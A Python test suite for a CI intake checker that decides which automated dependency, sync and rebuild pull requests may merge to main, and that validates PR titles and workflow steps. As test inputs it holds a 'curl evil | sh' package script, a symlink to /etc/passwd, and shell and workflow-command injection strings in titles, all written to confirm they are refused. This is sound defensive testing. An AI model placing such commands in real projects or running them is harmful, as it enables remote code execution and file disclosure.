"""Tests for intake.py, its action and the meta workflow's pr-policy job."""

from __future__ import annotations

import os
import re
import subprocess
import tempfile
import tomllib
import unittest
from pathlib import Path
from typing import ClassVar
from unittest import mock

import intake
import inventory
import workflow_replay
import yaml

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
CI_YAML = ROOT / '.github' / 'workflows' / 'ci.yaml'
ACTION = ROOT / 'actions' / 'intake' / 'action.yml'
REPO = 'cplieger/demo'
GIT_ENV = {
    'GIT_AUTHOR_NAME': 't',
    'GIT_AUTHOR_EMAIL': 't@example.invalid',
    'GIT_COMMITTER_NAME': 't',
    'GIT_COMMITTER_EMAIL': 't@example.invalid',
    'GIT_CONFIG_GLOBAL': os.devnull,
    'GIT_CONFIG_NOSYSTEM': '1',
}

GO_MOD = """module github.com/cplieger/demo

go 1.27.1

require (
\tgithub.com/acme/lib v1.4.0
\tgithub.com/acme/zero v0.3.0
\tgolang.org/x/text v0.38.0 // indirect
)
"""
LOCK = """{
  "name": "demo",
  "lockfileVersion": 3,
  "packages": {
    "": {"name": "demo", "version": "1.0.0", "dependencies": {"left-pad": "^1.2.0"}},
    "node_modules/left-pad": {"version": "1.2.0", "resolved": "https://r/left-pad-1.2.0.tgz", "integrity": "sha512-a"}
  }
}
"""
PACKAGE = '{"name": "demo", "version": "1.0.0", "scripts": {"t": "x"}, "dependencies": {"left-pad": "^1.2.0"}}\n'
DOCKERFILE = 'FROM alpine:3.24.1@sha256:' + '1' * 64 + '\nRUN true\n'


def git(cwd: Path, *args: str) -> str:
    env = {**os.environ, **GIT_ENV}
    return subprocess.run(
        ['git', '-C', str(cwd), *args], check=True, capture_output=True, text=True, env=env
    ).stdout.strip()


class Fixture:
    """A repository whose `main` holds the base files, with a head branch on top."""

    def __init__(self, files: dict[str, str]):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        git(self.dir, 'init', '-q', '-b', 'main')
        self.write(files)
        self.base = self.commit('chore: base')
        git(self.dir, 'checkout', '-q', '-b', 'head')

    def write(self, files: dict[str, str | None]):
        for path, text in files.items():
            target = self.dir / path
            if text is None:
                target.unlink()
                continue
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(text)

    def commit(self, subject: str, *, empty: bool = False) -> str:
        git(self.dir, 'add', '-A')
        git(self.dir, 'commit', '-q', *(['--allow-empty'] if empty else []), '-m', subject)
        return git(self.dir, 'rev-parse', 'HEAD')

    def change(self, files: dict[str, str | None]) -> str:
        self.write(files)
        return self.commit('fix(deps): update')

    def run(self, head_ref: str, head: str, **extra) -> tuple[int, str]:
        argv = [
            'intake',
            f'--head-ref={head_ref}',
            f'--head-repo={extra.pop("head_repo", REPO)}',
            f'--repository={REPO}',
            f'--base-sha={extra.pop("base", self.base)}',
            f'--head-sha={head}',
            f'--git-dir={self.dir}',
        ]
        if 'sync_owned' in extra:
            argv.append(f'--sync-owned={extra.pop("sync_owned")}')
        assert not extra, extra
        out = []
        with mock.patch('builtins.print', lambda *a, **_: out.append(' '.join(map(str, a)))):
            code = intake.main(argv)
        return code, '\n'.join(out)

    def close(self):
        self.tmp.cleanup()


class IntakeCase(unittest.TestCase):
    files: ClassVar[dict[str, str]] = {
        'go.mod': GO_MOD,
        'go.sum': 'x\n',
        'main.go': 'package main\n',
    }

    def setUp(self):
        self.fx = Fixture(self.files)
        self.addCleanup(self.fx.close)

    def renovate(self, files: dict[str, str | None]) -> tuple[int, str]:
        return self.fx.run('renovate/main-weekly-dependencies', self.fx.change(files))

    def assert_allowed(self, result):
        self.assertEqual(result, (0, 'intake: allowed'))

    def assert_refused(self, result, *needles: str):
        code, out = result
        self.assertEqual(code, 1, out)
        for needle in needles:
            self.assertIn(needle, out)


class Heads(IntakeCase):
    def test_a_human_head_is_refused_before_any_read(self):
        head = self.fx.change({'main.go': 'package main // edited\n'})
        self.assert_refused(
            self.fx.run('feat/thing', head), "'feat/thing' is not a branch main takes"
        )

    def test_a_dev_head_is_refused(self):
        head = self.fx.change({'go.mod': GO_MOD.replace('v1.4.0', 'v1.4.1')})
        self.assert_refused(self.fx.run('renovate/dev-weekly-dependencies', head), 'not a branch')

    def test_a_machine_head_name_from_a_fork_is_refused(self):
        head = self.fx.change({'go.mod': GO_MOD.replace('v1.4.0', 'v1.4.1')})
        self.assert_refused(
            self.fx.run('renovate/main-x', head, head_repo='someone/demo'),
            "comes from 'someone/demo'",
        )

    def test_main_moving_after_the_branch_is_not_the_heads_content(self):
        head = self.fx.change({'go.mod': GO_MOD.replace('v1.4.0', 'v1.4.1')})
        git(self.fx.dir, 'checkout', '-q', 'main')
        self.fx.write({'main.go': 'package main // human work promoted\n'})
        moved = self.fx.commit('release: promote dev into main')
        self.assert_allowed(self.fx.run('renovate/main-x', head, base=moved))


class Renovate(IntakeCase):
    files: ClassVar[dict[str, str]] = {
        'go.mod': GO_MOD,
        'go.sum': 'x\n',
        'main.go': 'package main\n',
        'package.json': PACKAGE,
        'package-lock.json': LOCK,
        'Dockerfile': DOCKERFILE,
        'uv.lock': '[[package]]\nname = "httpx"\nversion = "0.27.0"\nsource = { registry = "r" }\n',
    }

    def test_non_breaking_updates_are_allowed(self):
        self.assert_allowed(
            self.renovate(
                {
                    'go.mod': GO_MOD.replace('v1.4.0', 'v1.5.2')
                    .replace('v0.3.0', 'v0.4.0')
                    .replace('v0.38.0', 'v0.39.0')
                    .replace('go 1.27.1', 'go 1.27.3'),
                    'go.sum': 'y\n',
                    'package.json': PACKAGE.replace('^1.2.0', '^1.3.0'),
                    'package-lock.json': LOCK.replace('1.2.0', '1.3.1').replace('^1.3.1', '^1.3.0'),
                    'Dockerfile': DOCKERFILE.replace(
                        '3.24.1@sha256:' + '1' * 64, '3.24.2@sha256:' + '2' * 64
                    ),
                    'uv.lock': self.files['uv.lock'].replace('0.27.0', '0.28.1'),
                }
            )
        )

    def test_a_digest_only_move_is_allowed(self):
        self.assert_allowed(self.renovate({'Dockerfile': DOCKERFILE.replace('1' * 64, '3' * 64)}))

    def test_a_path_that_is_no_inventory_surface_is_refused(self):
        self.assert_refused(
            self.renovate({'main.go': 'package main // x\n', 'README.md': '# x\n'}),
            'main.go: not an inventory surface',
            'README.md: not an inventory surface',
        )

    def test_a_workflow_pin_is_refused(self):
        self.assert_refused(
            self.renovate({'.github/workflows/ci.yaml': 'on: push\n'}),
            '.github/workflows/ci.yaml: not an inventory surface',
        )

    def test_a_module_path_major_is_refused(self):
        moved = GO_MOD.replace('github.com/acme/lib v1.4.0', 'github.com/acme/lib/v2 v2.0.0')
        self.assert_refused(
            self.renovate({'go.mod': moved}),
            'go.mod: github.com/acme/lib/v2 replaces major 1 of github.com/acme/lib',
        )

    def test_an_incompatible_major_is_refused(self):
        moved = GO_MOD.replace('v1.4.0', 'v2.0.0+incompatible')
        self.assert_refused(
            self.renovate({'go.mod': moved}),
            'github.com/acme/lib v1.4.0 -> v2.0.0+incompatible is a major',
        )

    def test_a_go_directive_minor_is_refused(self):
        self.assert_refused(
            self.renovate({'go.mod': GO_MOD.replace('go 1.27.1', 'go 1.28.0')}),
            'go.mod: go 1.27.1 -> 1.28.0 is a minor update',
            'go.mod: toolchain 1.27.1 -> 1.28.0 is a minor update',
        )

    def test_a_toolchain_line_raising_the_effective_minor_is_refused(self):
        moved = GO_MOD.replace('go 1.27.1\n', 'go 1.27.1\n\ntoolchain go1.28.0\n')
        self.assert_refused(
            self.renovate({'go.mod': moved}), 'go.mod: toolchain 1.27.1 -> 1.28.0 is a minor update'
        )

    def test_a_toolchain_patch_line_is_allowed(self):
        moved = GO_MOD.replace('go 1.27.1\n', 'go 1.27.1\n\ntoolchain go1.27.4\n')
        self.assert_allowed(self.renovate({'go.mod': moved}))

    def test_an_npm_major_is_refused_in_the_lock_and_the_range(self):
        self.assert_refused(
            self.renovate(
                {
                    'package.json': PACKAGE.replace('^1.2.0', '^2.0.0'),
                    'package-lock.json': LOCK.replace('1.2.0', '2.0.0'),
                }
            ),
            'package-lock.json: left-pad 1.2.0 -> 2.0.0 is a major update',
            'package.json: left-pad ^1.2.0 -> ^2.0.0 is a major update',
        )

    def test_a_range_widened_to_a_new_major_is_refused(self):
        self.assert_refused(
            self.renovate({'package.json': PACKAGE.replace('^1.2.0', '^1.2.0 || ^2.0.0')}),
            'left-pad ^1.2.0 -> ^1.2.0 || ^2.0.0 is a major update',
        )

    def test_a_python_major_is_refused(self):
        self.assert_refused(
            self.renovate({'uv.lock': self.files['uv.lock'].replace('0.27.0', '1.0.0')}),
            'uv.lock: httpx 0.27.0 -> 1.0.0 is a major update',
        )

    def test_an_image_major_or_variant_is_refused(self):
        for tag in ('4.0.0', '3.24.2-slim'):
            with self.subTest(tag=tag):
                self.setUp()
                self.assert_refused(
                    self.renovate({'Dockerfile': DOCKERFILE.replace('3.24.1', tag)}),
                    f'Dockerfile: alpine 3.24.1 -> {tag} is a major update',
                )

    def test_a_value_with_no_order_is_refused(self):
        self.assert_refused(
            self.renovate({'Dockerfile': DOCKERFILE.replace('alpine:3.24.1', 'alpine:latest')}),
            'alpine 3.24.1 -> latest: no version order to rule out a major update',
        )

    def test_a_surface_changed_outside_its_records_is_refused(self):
        self.assert_refused(
            self.renovate({'package.json': PACKAGE.replace('"t": "x"', '"t": "curl evil | sh"')}),
            'package.json: changed outside its dependency records',
        )

    def test_an_added_or_deleted_surface_is_refused(self):
        self.assert_refused(
            self.renovate({'tools/go.mod': GO_MOD, 'uv.lock': None}),
            'tools/go.mod: added, not updated',
            'uv.lock: deleted, not updated',
        )

    def test_an_unreadable_surface_is_refused(self):
        self.assert_refused(
            self.renovate({'package-lock.json': '{not json'}), 'cannot read package-lock.json'
        )


FCLONES_DOCKERFILE = (
    'FROM rust:1.99@sha256:' + '4' * 64 + ' AS build\n'
    '# renovate: datasource=github-tags depName=pkolaczk/fclones digest=commit\n'
    'ARG FCLONES_REF=v0.34.0\n'
    'ARG FCLONES_COMMIT=' + 'a' * 40 + '\n'
    '# repin: dep=pkolaczk/fclones url=https://example.invalid/{version}.tar.gz\n'
    'ARG FCLONES_SHA256_AMD64=' + '5' * 64 + '\n'
    'COPY licenses/crates/ /licenses/crates/\n'
)
FCLONES_BUMPED = (
    FCLONES_DOCKERFILE.replace('v0.34.0', 'v0.35.0')
    .replace('a' * 40, 'b' * 40)
    .replace('5' * 64, '6' * 64)
)


class RegeneratedTree(IntakeCase):
    files: ClassVar[dict[str, str]] = {
        'Dockerfile': FCLONES_DOCKERFILE,
        'licenses/crates/MANIFEST': 'aho-corasick 1.1.3\nlibc 0.2.170\n',
        'licenses/crates/aho-corasick/LICENSE-MIT': 'MIT\n',
        'licenses/crates/libc/LICENSE-MIT': 'MIT\n',
    }

    def test_a_tree_regenerated_with_its_pin_is_allowed(self):
        self.assert_allowed(
            self.renovate(
                {
                    'Dockerfile': FCLONES_BUMPED,
                    'licenses/crates/MANIFEST': 'aho-corasick 1.1.4\nmemchr 2.7.4\n',
                    'licenses/crates/aho-corasick/LICENSE-MIT': 'MIT, 2026\n',
                    'licenses/crates/memchr/COPYING': 'Unlicense OR MIT\n',
                    'licenses/crates/libc/LICENSE-MIT': None,
                }
            )
        )

    def test_a_tree_change_without_its_pin_is_refused(self):
        self.assert_refused(
            self.renovate({'licenses/crates/MANIFEST': 'aho-corasick 1.1.3\n'}),
            'licenses/crates/MANIFEST: regenerated by pkolaczk/fclones, '
            'which this pull request does not move',
        )

    def test_a_tree_change_beside_another_pin_is_refused(self):
        self.assert_refused(
            self.renovate(
                {
                    'Dockerfile': FCLONES_DOCKERFILE.replace('4' * 64, '7' * 64),
                    'licenses/crates/libc/LICENSE-MIT': 'MIT, edited\n',
                }
            ),
            'licenses/crates/libc/LICENSE-MIT: regenerated by pkolaczk/fclones, which',
        )

    def test_a_symlink_or_an_executable_in_the_tree_is_refused(self):
        self.fx.write({'Dockerfile': FCLONES_BUMPED})
        os.symlink('/etc/passwd', self.fx.dir / 'licenses/crates/libc/NOTICE')
        script = self.fx.dir / 'licenses/crates/libc/COPYING'
        script.write_text('#!/bin/sh\n')
        script.chmod(0o755)
        head = self.fx.commit('fix(deps): update')
        self.assert_refused(
            self.fx.run('renovate/main-weekly-dependencies', head),
            'licenses/crates/libc/NOTICE: mode 120000',
            'licenses/crates/libc/COPYING: mode 100755',
        )

    def test_a_licenses_path_outside_the_tree_is_refused(self):
        self.assert_refused(
            self.renovate({'Dockerfile': FCLONES_BUMPED, 'licenses/other/LICENSE': 'x\n'}),
            'licenses/other/LICENSE: not an inventory surface',
        )


AAGUID_SOURCE = (
    'package webauthn\n\n'
    '// renovate: datasource=git-refs depName=passkey-authenticator-aaguids '
    'packageName=https://example.invalid/aaguids branch=main\n'
    'const aaguidListCommit = "' + 'a' * 40 + '"\n'
)


class RegeneratedByGoSourcePin(IntakeCase):
    files: ClassVar[dict[str, str]] = {
        'webauthn/aaguids_source.go': AAGUID_SOURCE,
        'webauthn/aaguids_gen.go': 'package webauthn\n// list at aaaa\n',
        'webauthn/testdata/aaguid.json': '{}\n',
    }

    def test_the_generated_files_with_their_pin_are_allowed(self):
        self.assert_allowed(
            self.renovate(
                {
                    'webauthn/aaguids_source.go': AAGUID_SOURCE.replace('a' * 40, 'b' * 40),
                    'webauthn/aaguids_gen.go': 'package webauthn\n// list at bbbb\n',
                    'webauthn/testdata/aaguid.json': '{"x": {}}\n',
                }
            )
        )

    def test_a_go_source_change_beside_its_pin_is_refused(self):
        self.assert_refused(
            self.renovate(
                {
                    'webauthn/aaguids_source.go': AAGUID_SOURCE.replace('a' * 40, 'b' * 40)
                    + 'func init() {}\n'
                }
            ),
            'webauthn/aaguids_source.go: changed outside its dependency records',
        )

    def test_the_generated_files_without_their_pin_are_refused(self):
        self.assert_refused(
            self.renovate({'webauthn/aaguids_gen.go': 'package webauthn\n// edited\n'}),
            'webauthn/aaguids_gen.go: regenerated by passkey-authenticator-aaguids, '
            'which this pull request does not move',
        )


class Sync(IntakeCase):
    def setUp(self):
        super().setUp()
        scratch = tempfile.TemporaryDirectory()
        self.addCleanup(scratch.cleanup)
        self.scratch = Path(scratch.name)
        owned = self.scratch / 'owned.txt'
        owned.write_text('# synced\n.editorconfig\n.github/workflows/*.yaml\n')
        self.owned = str(owned)

    def test_sync_owned_paths_only_are_allowed(self):
        head = self.fx.change(
            {'.editorconfig': 'root = true\n', '.github/workflows/ci.yaml': 'x\n'}
        )
        self.assert_allowed(self.fx.run('repo-sync/ci/main', head, sync_owned=self.owned))

    def test_any_other_path_is_refused(self):
        head = self.fx.change(
            {'.editorconfig': 'x\n', 'go.mod': GO_MOD.replace('v1.4.0', 'v1.4.1')}
        )
        self.assert_refused(
            self.fx.run('repo-sync/ci/main', head, sync_owned=self.owned),
            'go.mod: not a sync-owned path',
        )

    def test_the_published_set_is_read_from_classify_repos(self):
        (self.scratch / 'classify-repos.py').write_text(
            "def sync_owned_patterns():\n    return ['.editorconfig']\n"
        )
        allowed = self.fx.change({'.editorconfig': 'x\n'})
        refused = self.fx.change({'cliff.toml': 'x\n'})
        with mock.patch.object(intake, 'SCRIPTS', self.scratch):
            self.assert_allowed(self.fx.run('repo-sync/ci/main', allowed))
            self.assert_refused(
                self.fx.run('repo-sync/ci/main', refused), 'cliff.toml: not a sync-owned path'
            )

    def test_no_published_set_fails_closed(self):
        head = self.fx.change({'.editorconfig': 'x\n'})
        for source in ('', 'SYNC = 1\n', 'def sync_owned_patterns():\n    return []\n'):
            if source:
                (self.scratch / 'classify-repos.py').write_text(source)
            with self.subTest(source=source), mock.patch.object(intake, 'SCRIPTS', self.scratch):
                code, out = self.fx.run('repo-sync/ci/main', head)
                self.assertEqual(code, 2)
                self.assertIn('sync-owned set', out)


class Rebuild(IntakeCase):
    def test_one_empty_commit_is_allowed(self):
        head = self.fx.commit('fix(deps): rebuild', empty=True)
        self.assert_allowed(self.fx.run('rebuild/main-2026-10-04', head))

    def test_two_commits_are_refused(self):
        self.fx.commit('fix(deps): rebuild', empty=True)
        head = self.fx.commit('fix(deps): rebuild again', empty=True)
        self.assert_refused(self.fx.run('rebuild/main-2026-10-04', head), 'this one carries 2')

    def test_a_commit_changing_a_file_is_refused(self):
        head = self.fx.change({'main.go': 'package main // x\n'})
        self.assert_refused(
            self.fx.run('rebuild/main-2026-10-04', head), 'changes files, where a rebuild'
        )

    def test_a_merge_commit_is_refused(self):
        git(self.fx.dir, 'checkout', '-q', 'main')
        tip = self.fx.commit('chore: on main', empty=True)
        merge = git(
            self.fx.dir, 'commit-tree', f'{tip}^{{tree}}', '-p', tip, '-p', self.fx.base, '-m', 'm'
        )
        self.assert_refused(
            self.fx.run('rebuild/main-2026-10-04', merge, base=tip), 'has one parent, not 2'
        )


class ReleaseLines(unittest.TestCase):
    def test_lines_per_versioning(self):
        cases = [
            ('semver', '1.2.3', {1}),
            ('semver', '0.4.0', {0}),
            ('go-semver', 'v2.0.0+incompatible', {2}),
            ('go-semver', 'v0.0.0-20260101000000-abcdefabcdef', {0}),
            ('go-version', '1.27.2', {(1, 27)}),
            ('go-version', '1.27', {(1, 27)}),
            ('go-version', '1.28rc1', {(1, 28)}),
            ('pep440', '1!2.0', {(1, 2)}),
            ('pep440', '2.0.0.post1', {(0, 2)}),
            ('docker', '3.24.2-alpine', {(3, '-alpine')}),
            ('loose', 'v1.9.0', {('', 1)}),
            ('range', '^1.2.0 || ~2.1', {1, 2}),
            ('range', '>=1.2.3 <2.0.0', {1, 2}),
            ('range', '1.x', {1}),
        ]
        for versioning, value, lines in cases:
            with self.subTest(versioning=versioning, value=value):
                self.assertEqual(inventory.release_lines(versioning, value), frozenset(lines))

    def test_unordered_values_have_no_line(self):
        for versioning, value in (
            ('semver', '1.2'),
            ('docker', 'latest'),
            ('range', '*'),
            ('range', 'latest'),
            ('range', 'workspace:^1.0.0'),
            ('range', 'git+https://x/y.git#v1.2.3'),
            ('', 'abc'),
        ):
            with self.subTest(versioning=versioning, value=value):
                self.assertIsNone(inventory.release_lines(versioning, value))


class Title(unittest.TestCase):
    def test_accepted(self):
        for title in (
            'feat: subtitles in mov_text tracks decode again',
            'fix(deps): update module github.com/acme/lib to v1.5.2 (main)',
            'chore(devdeps): update vitest monorepo to v4.1.11',
            'refactor(web/ui)!: drop the legacy theme',
            'sec: refuse a path outside the root',
            'perf: cache the parsed manifest',
            'fix: a title with `$(touch /tmp/x)` and "quotes"; exit 0',
        ):
            with self.subTest(title=title):
                self.assertEqual(intake.check_title(title), [])

    def test_refused(self):
        for title in (
            'Update the readme',
            'Feat: capitalised type',
            'feat:no space',
            'feat:  ',
            'feat(): empty scope',
            'feat(a b): spaced scope',
            'fet: a typo',
            'build: an unrouted type',
            'release: promote dev into main',
            'Revert "feat: x"',
            'Merge branch main',
            'feat: first line\nsecond line',
            '',
        ):
            with self.subTest(title=title):
                self.assertEqual(len(intake.check_title(title)), 1)

    def test_every_type_is_one_both_cliff_configs_route_by_name(self):
        for config in ('cliff-stable.toml', 'cliff-alpha.toml'):
            parsers = tomllib.loads((ROOT / 'configs' / config).read_text())['git'][
                'commit_parsers'
            ]
            named = {m[1] for p in parsers for m in re.finditer(r'\^\[?([a-z]+)', p['message'])}
            with self.subTest(config=config):
                self.assertEqual(set(intake.TITLE_TYPES), named - {'release', 'erge'})

    def test_the_annotation_cannot_open_another_command(self):
        line = intake.annotate("title 'x\n::add-mask::y%' refused")
        self.assertEqual(line, "::error::title 'x%0A::add-mask::y%25' refused")


def action_body() -> tuple[dict, str]:
    step = yaml.safe_load(ACTION.read_text())['runs']['steps'][0]
    return step['env'], step['run']


class Action(unittest.TestCase):
    def test_pull_request_values_reach_the_script_through_env_only(self):
        env, run = action_body()
        self.assertNotIn('${{', run)
        self.assertEqual(env['PR_TITLE'], '${{ inputs.title }}')
        self.assertEqual(env['HEAD_REF'], '${{ inputs.head-ref }}')

    def test_a_title_with_shell_metacharacters_is_data(self):
        _, run = action_body()
        with tempfile.TemporaryDirectory() as tmp:
            canary = Path(tmp) / 'ran'
            failures = Path(tmp) / 'failures'
            run = run.replace('/tmp/_ci_failures', str(failures))
            for title, code in (
                (f'fix: $(touch {canary}) `touch {canary}`', 0),
                (f'"; touch {canary}; echo "', 1),
            ):
                env = {
                    **os.environ,
                    'GITHUB_ACTION_PATH': str(ACTION.parent),
                    'CHECK': 'title',
                    'PR_TITLE': title,
                }
                with self.subTest(title=title):
                    proc = subprocess.run(
                        ['bash', '-c', run], env=env, capture_output=True, text=True, check=False
                    )
                    self.assertEqual(proc.returncode, code, proc.stdout + proc.stderr)
                    self.assertFalse(canary.exists())
            self.assertEqual(failures.read_text(), 'Pull request title\n')

    def test_the_script_and_its_imports_ship_beside_the_action(self):
        for name in ('intake.py', 'inventory.py', 'release_channels.py'):
            self.assertTrue((ACTION.parent / '..' / '..' / 'scripts' / name).is_file(), name)


def context(
    event: str, default_branch: str, base_ref: str = '', *, private=False, fork=False
) -> dict:
    """The expression contexts of a run: GitHub's event payload carries
    `private` and `fork` on every repository object."""
    repository = {'default_branch': default_branch, 'private': private, 'fork': fork}
    return {
        'github': {'event_name': event, 'event': {'repository': repository}, 'base_ref': base_ref}
    }


def evaluate(expression: str, ctx: dict) -> bool:
    return workflow_replay.Scope(ctx, {}, []).condition(expression)


class Workflow(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.jobs = yaml.safe_load(CI_YAML.read_text())['jobs']
        cls.job = cls.jobs['pr-policy']

    def step(self, name: str) -> dict:
        return next(s for s in self.job['steps'] if s.get('name') == name)

    def runs(self, ctx: dict[str, str]) -> list[str]:
        if not evaluate(self.job['if'], ctx):
            return []
        return [
            s.get('name', 'checkout')
            for s in self.job['steps']
            if 'if' not in s or s['if'] == 'always()' or evaluate(s['if'], ctx)
        ]

    def test_main_default_repos_skip_the_job(self):
        for event, base in (('pull_request', 'main'), ('push', ''), ('workflow_dispatch', '')):
            with self.subTest(event=event):
                self.assertEqual(self.runs(context(event, 'main', base)), [])

    def test_a_private_or_forked_dev_default_repo_skips_the_job(self):
        for flags in ({'private': True}, {'fork': True}):
            for base in ('dev', 'main'):
                with self.subTest(base=base, **flags):
                    self.assertEqual(self.runs(context('pull_request', 'dev', base, **flags)), [])

    def test_two_branch_pull_requests_check_the_title_and_main_intake(self):
        self.assertEqual(
            self.runs(context('pull_request', 'dev', 'dev')),
            ['Check out the ci source', 'Pull request title', 'Check results'],
        )
        self.assertEqual(
            self.runs(context('pull_request', 'dev', 'main')),
            [
                'checkout',
                'Check out the ci source',
                'Pull request title',
                'Main intake',
                'Check results',
            ],
        )
        self.assertEqual(self.runs(context('push', 'dev')), [])

    def test_both_checks_run_the_workflows_own_action_with_pull_request_values(self):
        title, main = self.step('Pull request title'), self.step('Main intake')
        for s in (title, main):
            self.assertEqual(s['uses'], './.cplieger-ci/actions/intake')
            self.assertTrue(s['continue-on-error'])
        self.assertEqual(
            title['with'], {'check': 'title', 'title': '${{ github.event.pull_request.title }}'}
        )
        self.assertEqual(main['with']['head-ref'], '${{ github.head_ref }}')
        checkout = next(s for s in self.job['steps'] if 'actions/checkout@' in s.get('uses', ''))
        self.assertEqual(checkout['with']['ref'], '${{ github.event.pull_request.head.sha }}')
        self.assertEqual(checkout['with']['fetch-depth'], 0)
        source = self.step('Check out the ci source')
        self.assertEqual(source['with']['ref'], '${{ job.workflow_sha }}')
        self.assertEqual(source['with']['path'], '.cplieger-ci')

    def check_results(self, base_ref: str, marker: str = '', **outcomes: str):
        step = self.step('Check results')
        self.assertEqual(step['if'], 'always()')
        with tempfile.TemporaryDirectory() as tmp:
            failures = Path(tmp, 'failures')
            if marker:
                failures.write_text(marker + '\n')
            env = {**os.environ}
            for name, expr in step['env'].items():
                if expr == '${{ github.base_ref }}':
                    env[name] = base_ref
                    continue
                step_id = re.fullmatch(r'\$\{\{ steps\.(\w+)\.outcome \}\}', expr)[1]
                env[name] = outcomes[step_id]
            run = step['run'].replace('/tmp/_ci_failures', str(failures))
            return subprocess.run(
                ['bash', '-e', '-c', run], env=env, capture_output=True, text=True, check=False
            )

    def test_the_outcomes_read_are_the_two_action_steps(self):
        self.assertEqual(self.step('Pull request title')['id'], 'title')
        self.assertEqual(self.step('Main intake')['id'], 'intake')

    def test_check_results_passes_when_both_checks_passed_or_intake_was_not_due(self):
        for base, intake_outcome in (('main', 'success'), ('dev', 'skipped')):
            with self.subTest(base=base):
                proc = self.check_results(base, title='success', intake=intake_outcome)
                self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
                self.assertIn('All validation steps passed', proc.stdout)

    def test_an_action_that_failed_without_a_marker_fails_the_job(self):
        for base, title, intake_outcome, named in (
            ('dev', 'failure', 'skipped', 'Pull request title'),
            ('main', 'success', 'failure', 'Pull request intake'),
            ('main', 'success', 'skipped', 'Pull request intake'),
            ('dev', 'skipped', 'skipped', 'Pull request title'),
        ):
            with self.subTest(base=base, title=title, intake=intake_outcome):
                proc = self.check_results(base, title=title, intake=intake_outcome)
                self.assertEqual(proc.returncode, 1, proc.stdout)
                self.assertIn(named, proc.stderr)

    def test_a_recorded_failure_still_fails_the_job(self):
        proc = self.check_results(
            'main', marker='Pull request intake', title='success', intake='success'
        )
        self.assertEqual(proc.returncode, 1)
        self.assertEqual(proc.stderr, 'Pull request intake\n')

    def aggregate(self, default_branch: str = 'dev', *, private=False, fork=False, **results: str):
        validate = self.jobs['validate']
        self.assertIn('pr-policy', validate['needs'])
        step = validate['steps'][0]
        env = {**os.environ}
        scope = workflow_replay.Scope(
            context('pull_request', default_branch, private=private, fork=fork), {}, []
        )
        for name, expr in step['env'].items():
            if 'needs.' not in expr:
                env[name] = scope.render(expr)
                continue
            job = re.fullmatch(r'\$\{\{ needs\.([\w-]+)\.result \}\}', expr)[1]
            env[name] = results.get(
                job, 'skipped' if job not in ('detect', 'repo', 'markdown') else 'success'
            )
        with tempfile.NamedTemporaryFile(mode='r') as summary:
            env['GITHUB_STEP_SUMMARY'] = summary.name
            proc = subprocess.run(
                ['bash', '-c', step['run']], env=env, capture_output=True, text=True, check=False
            )
            return proc, summary.read()

    def test_validate_accepts_a_skipped_pr_policy(self):
        proc, summary = self.aggregate()
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertIn('pr-policy: skipped', proc.stdout)
        self.assertIn('of 13 dispatched jobs', summary)
        self.assertIn('| pr-policy | skipped |\n', summary)

    def test_validate_fails_on_a_failed_pr_policy(self):
        for result in ('failure', 'cancelled'):
            with self.subTest(result=result):
                proc, _ = self.aggregate(**{'pr-policy': result})
                self.assertEqual(proc.returncode, 1)
                self.assertIn(f'::error::pr-policy job: {result}', proc.stdout)

    def test_a_private_or_forked_dev_default_validate_does_not_list_pr_policy(self):
        for flags in ({'private': True}, {'fork': True}):
            with self.subTest(**flags):
                proc, summary = self.aggregate('dev', go='success', **flags)
                self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
                self.assertNotIn('pr-policy', proc.stdout + summary)
                self.assertIn('of 12 dispatched jobs', summary)

    def test_a_main_default_validate_reports_twelve_jobs_and_no_pr_policy(self):
        proc, summary = self.aggregate('main', go='success')
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertNotIn('pr-policy', proc.stdout)
        rows = ''.join(
            f'| {job} | {result} |\n'
            for job, result in (
                ('repo', 'success'),
                ('go', 'success'),
                ('go-nested', 'skipped'),
                ('ts', 'skipped'),
                ('web', 'skipped'),
                ('shell', 'skipped'),
                ('deadset', 'skipped'),
                ('docker', 'skipped'),
                ('docker-arm64', 'skipped'),
                ('markdown', 'success'),
                ('python', 'skipped'),
                ('scripts', 'skipped'),
            )
        )
        self.assertEqual(
            summary,
            '## CI validate\n\n'
            '**ran 3 / skipped 9** (of 12 dispatched jobs; detect: success)\n\n'
            '| Job | Result |\n|---|---|\n' + rows,
        )


if __name__ == '__main__':
    unittest.main()
